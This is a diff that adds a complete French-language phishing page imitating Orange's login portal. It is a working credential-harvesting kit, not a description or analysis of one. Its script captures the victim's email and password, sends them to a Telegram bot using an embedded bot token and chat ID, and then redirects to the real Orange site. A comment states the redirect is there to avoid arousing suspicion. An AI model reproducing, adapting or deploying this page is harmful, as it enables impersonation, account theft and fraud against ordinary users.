@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Portail Orange</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f6f6f6;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            text-align: left;
+        }
+
+        /* Logo Réel */
+        .logo-orange {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 25px;
+            display: block;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            color: #000;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        input:focus {
+            outline: 2px solid #ff7900;
+            border-color: transparent;
+        }
+
+        .btn-submit {
+            background-color: #ff7900; /* Orange plus vif pour le bouton */
+            color: white;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover {
+            background-color: #e66d00;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c8/Orange_logo.svg" alt="Orange" class="logo-orange">
+        
+        <h1>Identifiez-vous</h1>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">Adresse mail ou n° de mobile</label>
+                <input type="text" id="email" required>
+            </div>
+
+            <div class="input-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" required>
+            </div>
+
+            <button type="submit" class="btn-submit">Suivant</button>
+        </form>
+    </div>
+
+    <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        // Récupération des données du formulaire
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // --- TES PARAMÈTRES ICI ---
+        const botToken = "8026121554:AAFhlKS20DrJtKdoLh68Ju91_VcDs87ABBE";
+        const chatId = "8252190794";
+        // ---------------------------
+
+        const message = `🔔 NOUVEAU LOG ORANGE\n\n📧 Mail: ${email}\n🔑 Pass: ${password}`;
+
+        // Envoi vers l'API Telegram
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(() => {
+            // Une fois envoyé, on redirige l'utilisateur vers le vrai site
+            window.location.href = "https://login.orange.fr";
+        })
+        .catch((error) => {
+            console.error('Erreur:', error);
+            // Redirection quand même pour ne pas éveiller de soupçons
+            window.location.href = "https://login.orange.fr";
+        });
+    });
+</script>
+
+</body>
+</html>
